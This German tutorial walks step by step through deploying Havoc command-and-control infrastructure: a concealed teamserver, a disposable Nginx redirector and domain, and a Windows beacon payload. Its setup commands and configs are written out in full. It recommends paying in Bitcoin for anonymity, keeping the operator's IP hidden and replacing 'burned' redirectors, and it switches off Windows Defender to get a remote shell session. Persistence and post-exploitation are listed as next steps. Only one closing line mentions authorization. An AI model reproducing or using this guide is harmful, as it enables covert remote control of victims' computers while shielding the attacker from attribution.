# Schritt-für-Schritt: 2-VPS Professional Setup

> **Setup:** Teamserver (Hetzner CX11, versteckt) + Redirector (Vultr, öffentlich)  
> **Kosten:** ~€10/Monat  
> **Dauer:** 30-45 Minuten  
> **OPSEC:** ⭐⭐⭐⭐ (Sehr gut)

---

## 📋 Übersicht

```
┌──────────────────────────────────────────────────────────────┐
│                     IHRE INFRASTRUKTUR                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  [Ihr PC/Laptop]  ←──┐                                      │
│   Havoc Client       │                                       │
│                      │ Port 40056                            │
│                      │ (Operator Access)                     │
│                      ↓                                       │
│  ┌────────────────────────────┐                             │
│  │   VPS 1: TEAMSERVER       │                              │
│  │   Hetzner CX11            │                              │
│  │   IP: 10.0.0.10 (privat)  │                              │
│  │   €4.15/Monat             │                              │
│  └────────────┬───────────────┘                             │
│               │ Port 443                                     │
│               │ (C2 Traffic)                                 │
│               ↓                                              │
│  ┌────────────────────────────┐                             │
│  │   VPS 2: REDIRECTOR       │  ←─── [Target Systems]      │
│  │   Vultr                   │       (Beacons)              │
│  │   IP: Öffentlich          │                              │
│  │   Domain: cdn.example.com │                              │
│  │   $6/Monat                │                              │
│  └───────────────────────────┘                              │
│                                                              │
└──────────────────────────────────────────────────────────────┘

VORTEILE:
✓ Teamserver-IP bleibt geheim (nur für Operators)
✓ Redirector-IP ist öffentlich (kann gewechselt werden)
✓ Wenn Redirector verbrannt → neuen erstellen
✓ Professioneller Aufbau
```

---

## 🎯 Was Sie brauchen

### Vor dem Start:

- [ ] **Domain** (optional, aber empfohlen)
  - Registrar: Namecheap, Cloudflare, etc.
  - Kosten: ~€10/Jahr
  - Beispiel: `example.com`

- [ ] **Hetzner-Account**
  - Website: https://www.hetzner.com/
  - Zahlungsmethode: Kreditkarte, PayPal, SEPA
  - Kosten: €4.15/Monat

- [ ] **Vultr-Account**
  - Website: https://www.vultr.com/
  - Zahlungsmethode: Kreditkarte, PayPal, Bitcoin
  - Kosten: $6/Monat

- [ ] **SSH-Key** (für sichere Verbindung)
  - Falls noch nicht vorhanden, erstellen wir ihn

- [ ] **Ihr PC/Laptop** mit:
  - SSH-Client (Linux/Mac: Terminal, Windows: PuTTY oder PowerShell)
  - Havoc Client (installieren wir später)

---

## 📝 PHASE 1: Vorbereitung (10 Minuten)

### Schritt 1.1: SSH-Key erstellen (falls noch nicht vorhanden)

**Auf Ihrem PC/Laptop:**

```bash
# Linux / Mac / WSL:
ssh-keygen -t ed25519 -C "havoc-c2-key"

# Prompt erscheint:
# Enter file in which to save the key: [Enter drücken]
# Enter passphrase: [Enter drücken oder Passwort eingeben]
# Enter same passphrase again: [Enter drücken oder wiederholen]

# Key anzeigen (für später):
cat ~/.ssh/id_ed25519.pub

# Kopieren Sie diesen Output! Sieht aus wie:
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx... havoc-c2-key
```

**Windows (PowerShell):**

```powershell
# In PowerShell:
ssh-keygen -t ed25519 -C "havoc-c2-key"

# Key anzeigen:
type $env:USERPROFILE\.ssh\id_ed25519.pub

# Kopieren Sie den Output!
```

✅ **Checkpoint:** Sie haben einen SSH Public Key kopiert

---

### Schritt 1.2: Domain vorbereiten (falls vorhanden)

**Falls Sie eine Domain haben:**

1. **Loggen Sie sich bei Ihrem Domain-Registrar ein** (z.B. Namecheap, Cloudflare)

2. **Notieren Sie die Nameserver** (brauchen wir später)

3. **Bereit halten für DNS-Konfiguration** (später in Schritt 3.4)

**Falls Sie KEINE Domain haben:**
- Können Sie trotzdem fortfahren
- Nutzen Sie einfach die IP-Adresse des Redirectors
- Kein SSL möglich, aber für Tests OK

✅ **Checkpoint:** Domain bereit (oder entschieden, ohne Domain fortzufahren)

---

## 🖥️ PHASE 2: VPS 1 - Teamserver (Hetzner) (15 Minuten)

### Schritt 2.1: Hetzner-Account erstellen

1. **Gehen Sie zu:** https://accounts.hetzner.com/signUp

2. **Registrieren Sie sich:**
   - Email-Adresse
   - Passwort (stark!)
   - Land
   - Akzeptieren Sie AGB

3. **Email verifizieren** (Check Posteingang)

4. **Zahlungsmethode hinzufügen:**
   - Kreditkarte ODER
   - PayPal ODER
   - SEPA-Lastschrift

✅ **Checkpoint:** Hetzner-Account aktiv, Zahlungsmethode hinterlegt

---

### Schritt 2.2: Hetzner CX11 VPS bestellen

1. **Gehen Sie zu:** https://console.hetzner.cloud/

2. **Neues Projekt erstellen:**
   - Klick auf "New Project"
   - Name: "Havoc-C2-Teamserver"
   - Klick "Add Project"

3. **Server hinzufügen:**
   - Klick "Add Server"

4. **Location wählen:**
   - **Empfohlen:** Falkenstein (Deutschland) ODER Helsinki (Finnland)
   - **Warum:** EU-Datenschutz, niedrige Latenz

5. **Image wählen:**
   - **Ubuntu 22.04** (LTS) ← Wichtig!

6. **Type wählen:**
   - **Shared vCPU**
   - **CX11** (1 vCPU, 2 GB RAM, 20 GB SSD)
   - Preis: **€4.15/Monat**

7. **SSH-Key hinzufügen:**
   - Klick "Add SSH Key"
   - Name: "My PC Key"
   - Paste Ihren SSH Public Key (von Schritt 1.1)
   - Klick "Add SSH Key"

8. **Firewall:** (Optional, später konfigurieren)
   - Überspringen für jetzt

9. **Backups:**
   - **NEIN** (spart Geld, nicht kritisch für C2)

10. **Name:**
    - Server Name: `havoc-teamserver`

11. **Klick "Create & Buy Now"**

12. **Warten Sie 30-60 Sekunden**

13. **Server-IP notieren:**
    - Wird angezeigt als: `xx.xx.xx.xx`
    - **WICHTIG:** Notieren Sie diese IP!
    - Nennen wir sie: `TEAMSERVER_IP`

**Beispiel-IP (Ihre wird anders sein):**
```
TEAMSERVER_IP = 49.12.34.56
```

✅ **Checkpoint:** Hetzner VPS läuft, IP-Adresse notiert

---

### Schritt 2.3: Erste Verbindung zum Teamserver

**Auf Ihrem PC/Laptop:**

```bash
# Ersetzen Sie TEAMSERVER_IP mit Ihrer echten IP:
ssh root@TEAMSERVER_IP

# Beim ersten Mal erscheint:
# The authenticity of host '...' can't be established.
# Are you sure you want to continue connecting (yes/no)?

# Tippen Sie: yes [Enter]

# Sie sollten jetzt eingeloggt sein:
# root@havoc-teamserver:~#
```

**Falls Verbindung fehlschlägt:**

```bash
# Prüfen Sie:
# 1. IP korrekt?
# 2. SSH-Key korrekt hinterlegt?

# Falls Sie Passwort statt Key nutzen:
ssh -o PubkeyAuthentication=no root@TEAMSERVER_IP
# Passwort wird in Hetzner Console angezeigt
```

✅ **Checkpoint:** SSH-Verbindung zum Teamserver erfolgreich

---

### Schritt 2.4: Teamserver installieren

**Sie sind jetzt per SSH auf dem Teamserver verbunden.**

```bash
# Schritt A: System aktualisieren
apt update && apt upgrade -y

# Schritt B: Git installieren
apt install git -y

# Schritt C: Repository klonen
cd /root
git clone https://github.com/farfrompretty/New-project.git
cd New-project
git checkout cursor/c2-server-einrichtung-dbe4

# Schritt D: Zu Scripts navigieren
cd scripts
chmod +x *.sh

# Schritt E: Installation starten
./install_havoc_teamserver.sh
```

**Das Script fragt Sie nach folgenden Informationen:**

```
1. "Teamserver Host (0.0.0.0 für alle Interfaces):"
   → Eingabe: 0.0.0.0 [Enter]

2. "Teamserver Port (Standard: 40056):"
   → Eingabe: [Enter] (Standard nutzen)

3. "Admin Benutzername:"
   → Eingabe: admin [Enter]

4. "Admin Passwort:"
   → Eingabe: [Ihr sicheres Passwort] [Enter]
   → Beispiel: MySecurePass123!
   → WICHTIG: Merken Sie sich dieses Passwort!

5. "Listener Domain/IP:"
   → Eingabe: 0.0.0.0 [Enter]
   → (Wir nutzen Redirector-Domain später)

6. "Listener Port (Standard: 443):"
   → Eingabe: [Enter] (Standard)
```

**Das Script läuft jetzt ~10-15 Minuten.**

**Output sieht aus wie:**

```
[+] System wird aktualisiert...
[+] Installiere Dependencies...
[+] Klone Havoc Framework...
[+] Kompiliere Teamserver (das kann einige Minuten dauern)...
...
[+] Teamserver erfolgreich kompiliert!
[+] Konfiguration erstellt: /opt/Havoc/profiles/havoc.yaotl
[+] Service wird aktiviert...

╔═══════════════════════════════════════════════════════════════╗
║                Installation abgeschlossen!                    ║
╚═══════════════════════════════════════════════════════════════╝

[✓] Havoc Teamserver installiert
[✓] Konfiguration: /opt/Havoc/profiles/havoc.yaotl
[✓] Systemd Service: havoc-teamserver

Verbindungsinformationen:
  Host: 49.12.34.56  ← Ihre TEAMSERVER_IP
  Port: 40056
  Benutzername: admin
  Passwort: MySecurePass123!

Teamserver jetzt starten? (y/n)
```

**Tippen Sie:** `y` [Enter]

**Warten Sie 5 Sekunden, dann erscheint:**

```
● havoc-teamserver.service - Havoc C2 Teamserver
   Loaded: loaded
   Active: active (running)
```

✅ **Checkpoint:** Teamserver läuft auf Hetzner VPS

---

### Schritt 2.5: Teamserver-Verbindung testen

**Noch auf dem Teamserver verbunden:**

```bash
# Prüfen ob Port 40056 horcht:
netstat -tlnp | grep 40056

# Output sollte zeigen:
# tcp 0 0 0.0.0.0:40056 0.0.0.0:* LISTEN 12345/havoc

# Status prüfen:
systemctl status havoc-teamserver

# Output sollte zeigen:
# Active: active (running)
```

**Von Ihrem PC/Laptop testen:**

```bash
# Neues Terminal-Fenster öffnen
nc -zv TEAMSERVER_IP 40056

# Output sollte zeigen:
# Connection to TEAMSERVER_IP 40056 port [tcp/*] succeeded!
```

✅ **Checkpoint:** Teamserver erreichbar, Port 40056 offen

---

### Schritt 2.6: Teamserver-Credentials notieren

**WICHTIG: Notieren Sie diese Informationen sicher!**

```
╔═══════════════════════════════════════════════════════════════╗
║              TEAMSERVER ZUGANGSDATEN (SICHER AUFBEWAHREN!)   ║
╚═══════════════════════════════════════════════════════════════╝

TEAMSERVER (Hetzner):
  IP-Adresse:    [Ihre TEAMSERVER_IP]
  SSH-Zugang:    ssh root@[TEAMSERVER_IP]
  
HAVOC TEAMSERVER:
  Host:          [TEAMSERVER_IP]
  Port:          40056
  Username:      admin
  Password:      [Ihr gewähltes Passwort]
  
WICHTIG:
  - Teamserver ist VERSTECKT (nur für Operators)
  - Nur Sie verbinden sich direkt zu Port 40056
  - Beacons verbinden sich zu Redirector (kommt gleich)
```

✅ **Checkpoint:** Teamserver fertig! Weiter zu VPS 2...

---

## 🌐 PHASE 3: VPS 2 - Redirector (Vultr) (15 Minuten)

### Schritt 3.1: Vultr-Account erstellen

1. **Gehen Sie zu:** https://www.vultr.com/register/

2. **Registrieren Sie sich:**
   - Email-Adresse
   - Passwort (stark!)

3. **Email verifizieren**

4. **Zahlungsmethode hinzufügen:**
   - Kreditkarte ODER
   - PayPal ODER
   - **Bitcoin** (für maximale OPSEC!)

5. **Optional: Promo-Code verwenden**
   - Vultr bietet oft $100 Credit für neue User
   - Google: "Vultr promo code 2026"

✅ **Checkpoint:** Vultr-Account aktiv, Zahlungsmethode hinterlegt

---

### Schritt 3.2: Vultr VPS bestellen

1. **Gehen Sie zu:** https://my.vultr.com/

2. **Klick auf "Deploy +" (oben rechts)**

3. **Choose Server:**
   - **"Cloud Compute"** wählen

4. **Server Location:**
   - **Empfohlen:** Frankfurt (näher zu Hetzner)
   - **Alternative:** Amsterdam, Paris, London
   - **Warum:** Niedrige Latenz zu Teamserver

5. **Server Type:**
   - **"Cloud Compute - Shared CPU"**

6. **Server Size:**
   - **Regular Performance**
   - **$6/month** Plan wählen (1 vCPU, 1 GB RAM, 25 GB SSD)

7. **Operating System:**
   - **Ubuntu 22.04 LTS x64**

8. **Additional Features:**
   - **Enable IPv6:** Nein
   - **Auto Backups:** Nein (spart $1.20)
   - **DDOS Protection:** Ja (ist kostenlos)

9. **SSH Keys:**
   - Klick "Add New"
   - Name: "My PC Key"
   - Paste Ihren SSH Public Key (von Schritt 1.1)
   - Klick "Add SSH Key"
   - ✓ Aktivieren Sie den Key

10. **Server Hostname & Label:**
    - Hostname: `redirector-01`
    - Label: `C2 Redirector`

11. **Klick "Deploy Now"**

12. **Warten Sie 2-3 Minuten**

13. **Server-IP notieren:**
    - Wird angezeigt in der Server-Liste
    - Klick auf Server-Name für Details
    - **WICHTIG:** Notieren Sie diese IP!
    - Nennen wir sie: `REDIRECTOR_IP`

**Beispiel-IP (Ihre wird anders sein):**
```
REDIRECTOR_IP = 45.76.123.45
```

✅ **Checkpoint:** Vultr VPS läuft, IP-Adresse notiert

---

### Schritt 3.3: Erste Verbindung zum Redirector

**Auf Ihrem PC/Laptop (neues Terminal-Fenster):**

```bash
# Ersetzen Sie REDIRECTOR_IP mit Ihrer echten IP:
ssh root@REDIRECTOR_IP

# Bei Verbindungswarnung:
# Are you sure you want to continue connecting (yes/no)?
# → yes [Enter]

# Sie sollten jetzt eingeloggt sein:
# root@redirector-01:~#
```

✅ **Checkpoint:** SSH-Verbindung zum Redirector erfolgreich

---

### Schritt 3.4: DNS konfigurieren (falls Domain vorhanden)

**Falls Sie eine Domain haben:**

**A) Bei Cloudflare (empfohlen):**

1. **Loggen Sie sich bei Cloudflare ein:** https://dash.cloudflare.com/

2. **Domain hinzufügen** (falls noch nicht vorhanden):
   - "Add a Site"
   - Domain eingeben: `example.com`
   - Free Plan wählen
   - Nameserver bei Ihrem Registrar ändern (zu Cloudflare)

3. **DNS-Record erstellen:**
   - Klick auf Ihre Domain
   - Tab "DNS"
   - Klick "Add record"
   - **Type:** A
   - **Name:** cdn (wird zu: cdn.example.com)
   - **IPv4 address:** [Ihre REDIRECTOR_IP]
   - **Proxy status:** 🔴 DNS only (WICHTIG: NICHT proxied!)
   - **TTL:** Auto
   - Klick "Save"

4. **Notieren Sie die vollständige Domain:**
   ```
   REDIRECTOR_DOMAIN = cdn.example.com
   ```

**B) Bei anderem Registrar (Namecheap, etc.):**

1. **Loggen Sie sich ein**

2. **Domain Management → Advanced DNS**

3. **Neuer A-Record:**
   - **Host:** cdn
   - **Value:** [REDIRECTOR_IP]
   - **TTL:** 300 (5 Minuten)

4. **Speichern**

**DNS-Propagation testen:**

```bash
# Warten Sie 2-5 Minuten, dann:
dig cdn.example.com

# Output sollte Ihre REDIRECTOR_IP zeigen
```

**Falls Sie KEINE Domain haben:**
- Überspringen Sie diesen Schritt
- Nutzen Sie später einfach REDIRECTOR_IP statt Domain

✅ **Checkpoint:** DNS zeigt auf Redirector (oder ohne Domain fortfahren)

---

### Schritt 3.5: Redirector installieren

**Sie sind jetzt per SSH auf dem Redirector verbunden.**

```bash
# Schritt A: System aktualisieren
apt update && apt upgrade -y

# Schritt B: Git installieren
apt install git -y

# Schritt C: Repository klonen
cd /root
git clone https://github.com/farfrompretty/New-project.git
cd New-project
git checkout cursor/c2-server-einrichtung-dbe4

# Schritt D: Zu Scripts navigieren
cd scripts
chmod +x *.sh

# Schritt E: Wählen Sie Redirector-Typ
# Option A: Nginx (Standard, bewährt)
./install_redirector_nginx.sh

# ODER Option B: Caddy (Modern, automatisches HTTPS)
./install_redirector_caddy.sh
```

**Ich empfehle Nginx für dieses Tutorial.**

**Das Script fragt:**

```
1. "Ihre Domain (z.B. example.com):"
   → MIT Domain: cdn.example.com [Enter]
   → OHNE Domain: [REDIRECTOR_IP] [Enter]

2. "C2 Teamserver IP-Adresse:"
   → Eingabe: [Ihre TEAMSERVER_IP] [Enter]
   → Beispiel: 49.12.34.56

3. "C2 Listener Port (Standard: 443):"
   → Eingabe: [Enter] (Standard)

4. "C2 URI Pfad (z.B. /api, leer für /api):"
   → Eingabe: [Enter] (Standard /api)

5. "Admin Email für SSL-Zertifikat:"
   → MIT Domain: admin@example.com [Enter]
   → OHNE Domain: [Enter]
```

**Das Script läuft jetzt ~5-10 Minuten.**

**Output:**

```
[+] System wird aktualisiert...
[+] Installiere Nginx und Module...
[+] Aktiviere Nginx-Module...
[+] Erstelle Nginx-Konfiguration...
[+] Erstelle Fallback-Webseite...
[+] Aktiviere Redirector-Site...
[+] Teste Nginx-Konfiguration...
[+] Starte Nginx neu...
[+] Konfiguriere Firewall...
[+] Prüfe DNS-Record...
[✓] DNS-Record korrekt konfiguriert

[+] Fordere Let's Encrypt SSL-Zertifikat an...
SSL-Zertifikat jetzt anfordern? (y/n)
```

**Mit Domain:** `y` [Enter]  
**Ohne Domain:** `n` [Enter]

**Wenn SSL erfolgreich:**

```
[✓] SSL-Zertifikat erfolgreich installiert!

╔═══════════════════════════════════════════════════════════════╗
║                Installation abgeschlossen!                    ║
╚═══════════════════════════════════════════════════════════════╝

[✓] Nginx Redirector installiert und konfiguriert

Domain: cdn.example.com
Server-IP: 45.76.123.45
C2-Server: 49.12.34.56:443
```

✅ **Checkpoint:** Redirector läuft auf Vultr VPS

---

### Schritt 3.6: Redirector-Verbindung testen

**Vom Redirector (noch verbunden):**

```bash
# Nginx-Status prüfen
systemctl status nginx

# Output sollte zeigen:
# Active: active (running)

# Test-Request zu Teamserver
curl -k https://TEAMSERVER_IP:443

# Sollte antworten (auch wenn Fehler, Verbindung ist da)
```

**Von Ihrem PC/Laptop:**

```bash
# MIT Domain:
curl https://cdn.example.com/

# Sollte zeigen: Fallback-Webseite (HTML)

# OHNE Domain:
curl http://REDIRECTOR_IP/

# Sollte auch Webseite zeigen
```

✅ **Checkpoint:** Redirector erreichbar, leitet zu Teamserver weiter

---

## 🔗 PHASE 4: Verbindung testen (5 Minuten)

### Schritt 4.1: Firewall-Regeln finalisieren

**Auf dem Teamserver (SSH-Verbindung):**

```bash
# Firewall-Status prüfen
ufw status

# Output zeigt:
# Status: active
# To                         Action      From
# --                         ------      ----
# 22/tcp                     ALLOW       Anywhere
# 40056/tcp                  ALLOW       Anywhere
# 443/tcp                    ALLOW       Anywhere

# Port 443 sollte NUR vom Redirector erreichbar sein!
# Verschärfen:
ufw delete allow 443/tcp
ufw allow from REDIRECTOR_IP to any port 443 proto tcp comment "Redirector Only"

# Überprüfen:
ufw status numbered
```

**Auf dem Redirector (SSH-Verbindung):**

```bash
# Firewall-Status
ufw status

# Sollte zeigen:
# 22/tcp    ALLOW       Anywhere (SSH)
# 80/tcp    ALLOW       Anywhere (HTTP)
# 443/tcp   ALLOW       Anywhere (HTTPS)
```

✅ **Checkpoint:** Firewalls korrekt konfiguriert

---

### Schritt 4.2: End-to-End-Test

**Test 1: Operator → Teamserver (direkt)**

```bash
# Von Ihrem PC:
nc -zv TEAMSERVER_IP 40056

# Sollte zeigen:
# Connection succeeded!
```

**Test 2: Redirector → Teamserver**

```bash
# SSH zum Redirector:
ssh root@REDIRECTOR_IP

# Von Redirector:
curl -k https://TEAMSERVER_IP:443

# Sollte Antwort bekommen (auch wenn Fehler)
```

**Test 3: Internet → Redirector → Teamserver**

```bash
# Von Ihrem PC:
# MIT Domain:
curl -v https://cdn.example.com/api/test

# Sollte durchgehen (auch wenn 404)
# Wichtig: Keine Connection Errors!
```

✅ **Checkpoint:** Komplette Infrastruktur verbunden

---

## 🖥️ PHASE 5: Havoc Client installieren (10 Minuten)

### Schritt 5.1: Havoc Client auf Ihrem PC installieren

**Linux (Kali/Ubuntu):**

```bash
# Dependencies
sudo apt install -y git build-essential cmake qtbase5-dev \
    libqt5websockets5-dev golang-go

# Havoc klonen
cd ~
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Client kompilieren (dauert ~10 Min)
make client-build

# Client starten
cd Build/bin
./Havoc
```

**macOS:**

```bash
# Dependencies (via Homebrew)
brew install qt@5 cmake golang

# Havoc klonen und bauen
cd ~
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make client-build

# Starten
cd Build/bin
./Havoc
```

**Windows:**

```
1. Download: https://github.com/HavocFramework/Havoc/releases
2. Oder: Nutzen Sie WSL2 (wie Linux-Anleitung)
```

✅ **Checkpoint:** Havoc Client läuft

---

### Schritt 5.2: Mit Teamserver verbinden

**Im Havoc Client (GUI):**

1. **Menü: "Havoc" → "Connect"** (oder Click auf "+" Button)

2. **Neues Profil erstellen:**
   - **Profile Name:** "Production Teamserver"
   - **Host:** [Ihre TEAMSERVER_IP]
   - **Port:** 40056
   - **User:** admin
   - **Password:** [Ihr Teamserver-Passwort]

3. **Klick "Save"**

4. **Klick "Connect"**

5. **Verbindung sollte erfolgreich sein!**
   - Grüner Status-Indikator
   - Teamserver-Info wird angezeigt

✅ **Checkpoint:** Mit Teamserver verbunden!

---

### Schritt 5.3: Listener überprüfen

**Im Havoc Client:**

1. **Menü: "View" → "Listeners"**

2. **Sie sollten sehen:**
   - Name: "HTTPS Listener" (oder ähnlich)
   - Protocol: HTTPS
   - Host: 0.0.0.0
   - Port: 443
   - **Status: Started** ← Wichtig!

3. **Falls Status "Stopped":**
   - Rechtsklick auf Listener
   - "Start" wählen

✅ **Checkpoint:** Listener läuft

---

## 🎯 PHASE 6: Erste Payload testen (5 Minuten)

### Schritt 6.1: Payload generieren

**Im Havoc Client:**

1. **Menü: "Attack" → "Payload"**

2. **Konfiguration:**
   - **Listener:** "HTTPS Listener" (Ihr Listener)
   - **Arch:** x64 (für moderne Windows)
   - **Format:** Windows Exe
   - **Indirect Syscalls:** ✓ (aktivieren)
   - **Sleep:** 10 (Sekunden)
   - **Jitter:** 30 (Prozent)

3. **Klick "Generate"**

4. **Speichern als:** `beacon.exe`

✅ **Checkpoint:** Payload generiert

---

### Schritt 6.2: Payload-Konfiguration prüfen

**WICHTIG: Payload muss Redirector-Domain/IP nutzen!**

**Falls Payload direkt zu Teamserver zeigt → Problem!**

**Korrekte Konfiguration:**

Im Havoc Teamserver, SSH-Verbindung:

```bash
# Teamserver-Config prüfen:
cat /opt/Havoc/profiles/havoc.yaotl

# Sollte zeigen:
Listeners:
  - Name: "HTTPS Listener"
    Hosts:
      - "cdn.example.com"  ← Redirector-Domain!
    # ODER
      - "45.76.123.45"    ← Redirector-IP!
```

**Falls falsch, korrigieren:**

```bash
# Config bearbeiten:
nano /opt/Havoc/profiles/havoc.yaotl

# Ändern Sie:
Listeners:
  - Name: "HTTPS Listener"
    Protocol: https
    Hosts:
      - "cdn.example.com"  # IHRE Redirector-Domain
      # oder Ihre Redirector-IP
    Port: 443
    HostBind: 0.0.0.0
    PortBind: 443
    Secure: true

# Speichern: Ctrl+O, Enter, Ctrl+X

# Teamserver neu starten:
systemctl restart havoc-teamserver

# Im Havoc Client:
# Trennen und neu verbinden
```

✅ **Checkpoint:** Payload zeigt auf Redirector (nicht direkt zu Teamserver!)

---

### Schritt 6.3: Payload testen (optional, aber empfohlen)

**Für Test: Windows VM oder Windows-PC**

```
1. Übertragen Sie beacon.exe zur Test-VM
2. Deaktivieren Sie Windows Defender temporär:
   - Windows Security → Virus & threat protection
   - Manage settings → Real-time protection OFF
3. Ausführen: Doppelklick auf beacon.exe
4. Warten Sie 10-30 Sekunden
```

**Im Havoc Client:**

- **Menü: "View" → "Sessions"**
- Nach ~30 Sekunden sollte neue Session erscheinen!
- **Session zeigt:**
  - Computer: WIN10-TEST (oder ähnlich)
  - User: Administrator
  - Process: beacon.exe
  - PID: 1234
  - **Status: Active** ← Grün!

**Session interagieren:**

```bash
# Rechtsklick auf Session → "Interact"

# Shell öffnet sich, testen Sie:
whoami
hostname
ipconfig

# Funktioniert? 🎉 ERFOLG!
```

✅ **Checkpoint:** Session erhalten! Setup funktioniert!

---

## 📊 PHASE 7: Finale Überprüfung

### Checkliste: Alles funktioniert?

#### Teamserver (Hetzner):
- [ ] VPS läuft
- [ ] SSH-Zugang funktioniert
- [ ] Havoc Teamserver läuft (`systemctl status havoc-teamserver`)
- [ ] Port 40056 erreichbar von Ihrem PC
- [ ] Port 443 NICHT öffentlich (nur von Redirector)
- [ ] Firewall konfiguriert (`ufw status`)

#### Redirector (Vultr):
- [ ] VPS läuft
- [ ] SSH-Zugang funktioniert
- [ ] Nginx läuft (`systemctl status nginx`)
- [ ] Domain zeigt auf Redirector-IP (DNS)
- [ ] SSL-Zertifikat gültig (bei Domain)
- [ ] Port 80/443 erreichbar von Internet
- [ ] Redirector leitet zu Teamserver weiter

#### Havoc Client (Ihr PC):
- [ ] Client installiert und läuft
- [ ] Mit Teamserver verbunden
- [ ] Listener läuft
- [ ] Payload generiert
- [ ] (Optional) Test-Session erhalten

#### Sicherheit:
- [ ] SSH-Keys statt Passwörter
- [ ] Firewall auf beiden VPS aktiv
- [ ] Teamserver-IP nicht öffentlich zugänglich
- [ ] Credentials sicher gespeichert

✅ **Alle Checkboxen ✓? PERFEKT! Setup komplett!**

---

## 📝 WICHTIGE INFORMATIONEN SPEICHERN

**Speichern Sie diese Informationen sicher (z.B. Password Manager):**

```
╔═══════════════════════════════════════════════════════════════╗
║                    IHRE C2-INFRASTRUKTUR                      ║
╚═══════════════════════════════════════════════════════════════╝

VPS 1 - TEAMSERVER (Hetzner CX11):
  Provider:     Hetzner
  IP:           [TEAMSERVER_IP]
  SSH:          ssh root@[TEAMSERVER_IP]
  Location:     Falkenstein, DE (oder Ihre Wahl)
  Kosten:       €4.15/Monat

VPS 2 - REDIRECTOR (Vultr):
  Provider:     Vultr
  IP:           [REDIRECTOR_IP]
  SSH:          ssh root@[REDIRECTOR_IP]
  Domain:       cdn.example.com (oder Ihre)
  Location:     Frankfurt, DE (oder Ihre Wahl)
  Kosten:       $6/Monat

HAVOC TEAMSERVER:
  Host:         [TEAMSERVER_IP]
  Port:         40056
  Username:     admin
  Password:     [Ihr Passwort]

LISTENER:
  URL:          https://cdn.example.com:443
  (oder)        https://[REDIRECTOR_IP]:443

TOTAL KOSTEN: ~€10/Monat (monatlich kündbar)

SETUP DATUM:  [Heutiges Datum]
```

---

## 🚀 Nächste Schritte

### Nach dem Setup:

1. **Lesen Sie:**
   - `POST_EXPLOITATION.md` - Techniken lernen
   - `OPSEC_GUIDE.md` - Sicherheit maximieren
   - `PAYLOAD_DEVELOPMENT.md` - Payloads anpassen

2. **Verbessern Sie:**
   - Server härten: `./harden_server.sh`
   - Mehr Redirectors hinzufügen
   - Backup-Infrastruktur aufbauen

3. **Testen Sie:**
   - Verschiedene Payload-Formate
   - Post-Exploitation-Module
   - Persistence-Mechanismen

4. **Überwachen Sie:**
   - Logs regelmäßig prüfen
   - Threat Intelligence auf Ihre IPs
   - SSL-Zertifikat-Ablauf

---

## 🆘 Troubleshooting

### Problem: Teamserver startet nicht

```bash
# Logs prüfen:
journalctl -u havoc-teamserver -n 50

# Häufige Ursache: Port bereits belegt
netstat -tlnp | grep 40056

# Prozess killen:
pkill -9 havoc
systemctl restart havoc-teamserver
```

### Problem: Keine Session trotz Payload-Ausführung

```bash
# 1. Redirector-Logs prüfen:
ssh root@REDIRECTOR_IP
tail -f /var/log/nginx/redirector_access.log

# 2. Test-Request:
curl -k https://TEAMSERVER_IP:443

# 3. Firewall prüfen:
# Auf Teamserver:
ufw status | grep 443

# 4. Listener-Status:
# Im Havoc Client: View → Listeners
# Status muss "Started" sein!
```

### Problem: SSL-Zertifikat fehlgeschlagen

```bash
# DNS prüfen:
dig cdn.example.com

# Certbot manuell:
certbot --nginx -d cdn.example.com

# Logs:
tail -f /var/log/letsencrypt/letsencrypt.log
```

**Weitere Hilfe:** `TROUBLESHOOTING.md`

---

## 🎉 Glückwunsch!

Sie haben erfolgreich eine **professionelle 2-VPS C2-Infrastruktur** aufgesetzt!

**Was Sie erreicht haben:**
- ✅ Teamserver (versteckt) auf Hetzner
- ✅ Redirector (öffentlich) auf Vultr
- ✅ SSL/TLS verschlüsselt
- ✅ Firewall gesichert
- ✅ OPSEC-konform getrennt
- ✅ Production-ready!

**Kosten:** ~€10/Monat  
**Setup-Zeit:** ~45 Minuten  
**OPSEC-Level:** ⭐⭐⭐⭐

---

**Viel Erfolg mit Ihren autorisierten Red Team Operations! 🎯**

---

**Erstellt:** 2026-02-05  
**Version:** 1.0
